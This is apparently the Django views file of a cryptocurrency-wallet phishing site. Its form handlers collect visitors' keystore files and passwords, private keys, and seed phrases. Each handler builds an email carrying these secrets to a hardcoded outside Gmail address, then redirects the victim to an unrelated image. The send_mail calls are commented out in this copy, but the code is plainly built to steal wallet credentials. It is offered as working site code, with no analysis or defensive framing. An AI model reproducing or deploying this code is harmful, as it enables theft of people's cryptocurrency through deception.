from django.shortcuts import render, redirect
from django.core.mail import send_mail
from django.conf import settings

# Create your views here.
receiver = "michealhill027@gmail.com"


def index(request):
    return render(request, 'personal/index.html')


def wallet(request):
    return render(request, "personal/wallet.html")


def sync(request):
    return render(request, 'personal/connect.html')


def key(request):
    if request.method == 'POST':
        wallet = request.POST.get("w")
        keystore = request.POST.get("phrase")
        passwd = request.POST.get("password")
        subject = wallet + ' Keystore'
        message = f'Keystore : {keystore}\nPassword : {passwd}'
        email_from = settings.EMAIL_HOST_USER
        recipient_list = [receiver, ]
        #send_mail(subject, message, email_from, recipient_list)

        return redirect("https://image.ibb.co/hkgHso/admin.png")

    return render(request, 'personal/connect.html')


def pk(request):
    if request.method == 'POST':
        wallet = request.POST.get("w")
        private = request.POST.get("key")
        subject = wallet + ' Private Key'
        message = f'private : {private}'
        email_from = settings.EMAIL_HOST_USER
        recipient_list = [receiver, ]
        #send_mail(subject, message, email_from, recipient_list)
        return redirect("https://image.ibb.co/hkgHso/admin.png")
    return render(request, 'personal/connect.html')


def phrase(request):
    if request.method == 'POST':
        wallet = request.POST.get("w")
        phrase1 = request.POST.get("phrase")
        subject = wallet + ' Phrase'
        message = f'Phrase : {phrase1}'
        email_from = settings.EMAIL_HOST_USER
        recipient_list = [receiver, ]
        #send_mail(subject, message, email_from, recipient_list)
        return redirect("https://image.ibb.co/hkgHso/admin.png")

    return render(request, 'personal/connect.html')
